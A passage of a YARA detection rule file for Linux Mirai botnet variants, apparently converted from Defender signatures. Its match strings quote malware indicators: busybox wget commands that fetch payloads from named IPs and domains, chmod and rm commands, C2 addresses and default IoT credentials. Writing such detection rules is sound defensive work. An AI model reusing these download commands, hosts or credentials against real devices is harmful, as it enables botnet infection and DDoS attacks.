        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "2"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox wget -g 79.124.8.133 -l /tmp/monke -r /d" ascii //weight: 1
        $x_1_2 = "/tmp/monke selfrep.router" ascii //weight: 1
        $x_1_3 = "/x38/xFJ/x93/xID/x9A/x38/xFJ/x93/xID/x9A/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Backdoor_Linux_Mirai_SC_2147808337_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.SC!xp"
        threat_id = "2147808337"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "miori remastered infection successful" ascii //weight: 2
        $x_2_2 = "KILLBOT" ascii //weight: 2
        $x_2_3 = "if u wanna see source here: https://root_senpai.selly.store/" ascii //weight: 2
        $x_2_4 = "6SRS>B" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AE_2147812787_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AE!MTB"
        threat_id = "2147812787"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {00 30 d1 e5 00 00 53 e3 01 30 ce e5 01 c0 8e e2 20 00 00 0a 01 30 d1 e5 00 00 53 e3 01 30 cc e5 01 10 81 e2 01 c0 8c e2 1a 00 00 0a 01 30 d1 e5 00 00 53 e3 01 30 cc e5 01 10 81 e2 01 e0 8c e2 14 00 00 0a 01 c0 d1 e5 01 30 81 e2 00 00 5c e3 01 c0 ce e5 01 10 83 e2 01 e0 8e e2 0d 00 00 0a 01 00 50 e2 e5 ff ff 1a 03 20 02 e2}  //weight: 2, accuracy: High
        $x_1_2 = {6a 6e 64 69 3a 6c 64 ?? 70 3a 2f 2f [0-32] 2f}  //weight: 1, accuracy: Low
        $x_2_3 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 2, accuracy: High
        $x_2_4 = {0c 04 00 02 52 c2 44 02 0c 04 ff fb 53 c0 12 00 49 c1 44 81 0c 03 ff 83 57 c0 44 00 c0 02 02 80 00 00 00 ff c0 81 66 00 f1 76 0c 03 ff 84 57 c0 44 00 c4 00 42 80 10 02 c2 80 66 00 f1 62 0c 03 ff 86}  //weight: 2, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_H_2147812803_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.H!MTB"
        threat_id = "2147812803"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {00 10 a0 e3 04 20 a0 e3 00 00 95 e5 e1 06 00 eb 09 20 a0 e3 00 00 95 e5 f0 14 9f e5 e4 06 00 eb 00 10 95 e5 0f 00 a0 e3 95 12 00 eb e0 14 9f e5 15 20 a0 e3 01 00 a0 e3 f5 12 00 eb 35 12 00 eb 00 00 50 e3 24 01 00 ca}  //weight: 1, accuracy: High
        $x_1_2 = {10 40 2d e9 2f 00 a0 e3 fc 42 9f e5 fc 12 9f e5 15 20 a0 e3 e6 ff ff eb 2b 00 a0 e3 f0 12 9f e5 12 20 a0 e3 e2 ff ff eb 04 10 a0 e1 30 00 a0 e3 0b 20 a0 e3 de ff ff eb 01 00 a0 e3 d4 12 9f e5 0e 20 a0 e3 da ff ff eb 02 00 a0 e3 c8 12 9f e5 07 20 a0 e3 d6 ff ff eb 03 00 a0 e3 bc 12 9f e5 05 20 a0 e3 d2 ff ff eb 04 00 a0 e3 00 20 a0 e1 ac 12 9f e5 ce ff ff eb 05 00 a0 e3 a4 12 9f e5 09 20 a0 e3 ca ff ff eb 07 00 a0 e3 98 12 9f e5 98 22 9f e5 c6 ff ff eb 08 00 a0 e3 90 12 9f e5 11 20 a0 e3 c2 ff ff eb 09 00 a0 e3 84 12 9f e5 0c 20 a0 e3 be ff ff eb 04 10 a0 e1 06 00 a0 e3 0b 20 a0 e3 ba ff ff eb}  //weight: 1, accuracy: High
        $x_1_3 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii //weight: 1
        $x_1_4 = "/tmp/mirai" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_S_2147813591_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.S!xp"
        threat_id = "2147813591"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "KILLBOT" ascii //weight: 2
        $x_1_2 = "192.236.195.212" ascii //weight: 1
        $x_1_3 = "miori remastered" ascii //weight: 1
        $x_1_4 = "UDPRAW" ascii //weight: 1
        $x_1_5 = "Genocide Botnet" ascii //weight: 1
        $x_1_6 = "185.172.110.230" ascii //weight: 1
        $x_1_7 = "45.95.168.96" ascii //weight: 1
        $x_1_8 = "/bin/busybox" ascii //weight: 1
        $x_1_9 = "antihoney" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AI_2147814083_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AI!MTB"
        threat_id = "2147814083"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kill_all_running_attacks" ascii //weight: 1
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "Bot started" ascii //weight: 1
        $x_1_4 = "attack_udp" ascii //weight: 1
        $x_1_5 = "attack_stomp" ascii //weight: 1
        $x_1_6 = "start_attack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Mirai_AB_2147814534_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AB!xp"
        threat_id = "2147814534"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "busybox wget http://gameoffset.xyz" ascii //weight: 1
        $x_1_2 = "rm -rf wwww adb.sh" ascii //weight: 1
        $x_1_3 = "chmod 777 fdp" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AE_2147814694_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AE!xp"
        threat_id = "2147814694"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "PROT_EXEC" ascii //weight: 1
        $x_1_2 = "/proc/self/exe7" ascii //weight: 1
        $x_1_3 = "/proc/semn" ascii //weight: 1
        $x_1_4 = "antihoney" ascii //weight: 1
        $x_1_5 = "chmon7" ascii //weight: 1
        $x_1_6 = "mdebung.Hi32" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_SG_2147814696_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.SG!xp"
        threat_id = "2147814696"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "hoho botnet" ascii //weight: 1
        $x_1_2 = "dvr.lst" ascii //weight: 1
        $x_1_3 = "spoofed" ascii //weight: 1
        $x_1_4 = "./.akame" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AA_2147814701_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AA!xp"
        threat_id = "2147814701"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/tmp/wd/onuProbe" ascii //weight: 1
        $x_1_2 = "/home/hik/hicore" ascii //weight: 1
        $x_1_3 = "tcp-plain" ascii //weight: 1
        $x_1_4 = "killer_init" ascii //weight: 1
        $x_1_5 = "exe_kill" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_Z_2147815382_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Z!xp"
        threat_id = "2147815382"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/tmp/monke selfrep.router" ascii //weight: 1
        $x_1_2 = "/bin/busybox chmod 777" ascii //weight: 1
        $x_1_3 = "tmp/monke -r /" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AP_2147815668_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AP!MTB"
        threat_id = "2147815668"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DDoS Started" ascii //weight: 1
        $x_1_2 = "http flood" ascii //weight: 1
        $x_1_3 = "Failed to set IP_HDRINCL. Aborting" ascii //weight: 1
        $x_1_4 = "Cannot send DNS flood without a domain" ascii //weight: 1
        $x_1_5 = "[vega/table] tried to access table.%d but it is locked" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_U_2147815780_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.U!xp"
        threat_id = "2147815780"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killallbots" ascii //weight: 1
        $x_1_2 = "botnetfork" ascii //weight: 1
        $x_1_3 = "udppplainattack" ascii //weight: 1
        $x_1_4 = "ackattack" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AD_2147815784_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AD!xp"
        threat_id = "2147815784"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "killed tmp" ascii //weight: 1
        $x_1_2 = "exe_kill" ascii //weight: 1
        $x_1_3 = "kill_maps" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AH_2147815785_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AH!xp"
        threat_id = "2147815785"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "checksum.h" ascii //weight: 1
        $x_1_2 = "killer.h" ascii //weight: 1
        $x_1_3 = "killing processes" ascii //weight: 1
        $x_1_4 = "attack.h" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_SZ_2147816091_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.SZ!xp"
        threat_id = "2147816091"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/killallbots" ascii //weight: 1
        $x_1_2 = "youareadupe" ascii //weight: 1
        $x_1_3 = ".udpplain" ascii //weight: 1
        $x_1_4 = "/bin/busybox" ascii //weight: 1
        $x_1_5 = "/etc/dropbear/" ascii //weight: 1
        $x_1_6 = "/var/Sofia" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AG_2147816101_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AG!xp"
        threat_id = "2147816101"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "/bin/busybox CORONA" ascii //weight: 2
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
        $x_1_4 = "Protecting your device from further infections." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AJ_2147816822_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AJ!xp"
        threat_id = "2147816822"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/var/tmp/sonia" ascii //weight: 1
        $x_1_2 = "/dev/FTWDT101_watchdog" ascii //weight: 1
        $x_2_3 = "/bin/busybox chmod 777" ascii //weight: 2
        $x_1_4 = "/dev/netslink/" ascii //weight: 1
        $x_1_5 = "/bin/busybox rm -rf .file" ascii //weight: 1
        $x_1_6 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((4 of ($x_1_*))) or
            ((1 of ($x_2_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_O_2147817484_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.O!MTB"
        threat_id = "2147817484"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/bin/busybox PEACH" ascii //weight: 1
        $x_1_2 = "7ujMko0admin" ascii //weight: 1
        $x_1_3 = "peachy botnet" ascii //weight: 1
        $x_1_4 = "meinsm" ascii //weight: 1
        $x_1_5 = "xmhdipc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_M_2147817517_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.M!MTB"
        threat_id = "2147817517"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "w5q6he3dbrsgmclkiu4to18npavj702f" ascii //weight: 1
        $x_1_2 = "killer_kill_by_port" ascii //weight: 1
        $x_1_3 = "attack_app_http" ascii //weight: 1
        $x_1_4 = "attack_tcp_stomp" ascii //weight: 1
        $x_1_5 = "attack_udp_plain" ascii //weight: 1
        $x_1_6 = "attack_udp_vse" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_M_2147817517_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.M!MTB"
        threat_id = "2147817517"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {00 50 50 e2 12 00 00 0a 04 40 95 e5 ?? ff ff eb 00 10 d5 e5 ?? 06 00 eb ?? 31 94 e7 05 00 a0 e1 04 30 8d e5 ?? 01 00 eb 06 00 a0 e1 0d 10 a0 e1 10 20 a0 e3 ?? ?? ?? eb 01 00 70 e3 00 40 a0 e1 [0-9] 06 00 a0 e1 10 d0 8d e2 70 ?? bd e8}  //weight: 5, accuracy: Low
        $x_5_2 = {8f bc 00 10 24 03 ff ff 8f 99 81 40 10 ?? ?? ?? 02 40 20 21 02 40 10 21 8f bf 00 34 8f b2 00 30 8f b1 00 2c 8f b0 00 28 03 e0 00 08 27 bd 00 38 03 20 f8 09 24 12 ff ff 8f bc 00 10 10 ?? ?? ?? 02 40 10 21 03 ?? ?? ?? 24 12 ff ff 8f bc 00 10}  //weight: 5, accuracy: Low
        $x_1_3 = "black.fridgexperts.cc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_1_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_AL_2147817828_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AL!xp"
        threat_id = "2147817828"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/usr/sbin/dropbear" ascii //weight: 1
        $x_1_2 = "bfae8hfbu4iwhrf4iulwbriulq4w" ascii //weight: 1
        $x_1_3 = "[killer] finished" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_5 = "lLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_AM_2147817829_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AM!xp"
        threat_id = "2147817829"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/etc/resolv.conf" ascii //weight: 1
        $x_1_2 = "egvnmacnkr" ascii //weight: 1
        $x_1_3 = "nmnlmevdm" ascii //weight: 1
        $x_1_4 = "hlLjztqZ" ascii //weight: 1
        $x_1_5 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_AN_2147817830_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AN!xp"
        threat_id = "2147817830"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/etc/resolv.conf" ascii //weight: 1
        $x_1_2 = "onmlkjihw765432" ascii //weight: 1
        $x_1_3 = "dfe3chj42oiw5kbn7mla" ascii //weight: 1
        $x_1_4 = "4mw6hflnk3b5icde2joa" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AO_2147817832_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AO!xp"
        threat_id = "2147817832"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "/etc/config/resolv.conf" ascii //weight: 1
        $x_1_2 = "8969876hjkghblk" ascii //weight: 1
        $x_1_3 = "ghdugffytsdyt" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AK_2147817849_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AK!xp"
        threat_id = "2147817849"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "xp: an internal category used to refer to some threats"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "ddos_flood_tcp" ascii //weight: 2
        $x_2_2 = "ddos_flood_udp" ascii //weight: 2
        $x_2_3 = "running_parents" ascii //weight: 2
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Backdoor_Linux_Mirai_J_2147817927_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.J!MTB"
        threat_id = "2147817927"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "udprand" ascii //weight: 1
        $x_1_2 = "bypass" ascii //weight: 1
        $x_1_3 = "tcp-rand" ascii //weight: 1
        $x_1_4 = "attacks.c" ascii //weight: 1
        $x_1_5 = "[96mkiller" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_Q_2147817928_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.Q!MTB"
        threat_id = "2147817928"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "chmod+777+lolol.sh" ascii //weight: 1
        $x_1_2 = "/backupmgt/localJob.php" ascii //weight: 1
        $x_1_3 = "sh+lolol.sh" ascii //weight: 1
        $x_1_4 = {77 67 65 74 2b 68 74 74 70 [0-32] 2f 6c 6f 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: Low
        $x_1_5 = {63 75 72 6c 2b 2d 4f ?? ?? 68 74 74 70 [0-32] 2f 6c 6f 6c 6f 6c 2e 73 68}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule Backdoor_Linux_Mirai_P_2147817929_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.P!MTB"
        threat_id = "2147817929"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "TSource Engine Query" ascii //weight: 1
        $x_1_2 = "httpflood" ascii //weight: 1
        $x_1_3 = "lolnogtfo" ascii //weight: 1
        $x_1_4 = "udpplain" ascii //weight: 1
        $x_1_5 = "7ujMko0admin" ascii //weight: 1
        $x_1_6 = "hunt5759" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Backdoor_Linux_Mirai_P_2147817929_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.P!MTB"
        threat_id = "2147817929"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = {2f 62 69 6e 2f 62 75 73 79 62 6f 78 20 77 67 65 74 20 2d 67 [0-32] 2d 6c 20 2f 74 6d 70 2f [0-16] 20 2d 72}  //weight: 1, accuracy: Low
        $x_1_3 = "/bin/busybox chmod 777 * /tmp/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_T_2147817976_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.T!MTB"
        threat_id = "2147817976"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".killallbots" ascii //weight: 1
        $x_1_2 = ".ovhbypass" ascii //weight: 1
        $x_1_3 = "echo '@reboot" ascii //weight: 1
        $x_1_4 = "npxXoudifFeEgGaACScs" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule Backdoor_Linux_Mirai_AX_2147818126_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AX!MTB"
        threat_id = "2147818126"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "StormMinecraft" ascii //weight: 1
        $x_1_2 = "JHBypass" ascii //weight: 1
        $x_1_3 = "lackpeople.lol/bins.sh" ascii //weight: 1
        $x_1_4 = "MIRAI" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AU_2147818184_0
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AU!MTB"
        threat_id = "2147818184"
        type = "Backdoor"
        platform = "Linux: Linux platform"
        family = "Mirai"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_ELFHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = {8b 19 89 d0 01 d8 89 eb 30 18 89 d0 8b 19 01 d8 89 fb 30 18 89 d0 8b 19 01 d8 89 f3 30 18 89 d0 8b 19 42 01 d8 8a 1c 24 30 18 8b 41 04 25 ff ff 00 00 39 d0 7f ca}  //weight: 1, accuracy: High
        $x_1_2 = "npxXoudifFeEgGaACScs" ascii //weight: 1
        $x_1_3 = "hlLjztqZ" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Backdoor_Linux_Mirai_AU_2147818184_1
{
    meta:
        author = "defender2yara"
        detection_name = "Backdoor:Linux/Mirai.AU!MTB"
        threat_id = "2147818184"
        type = "Backdoor"
        platform = "Linux: Linux platform"
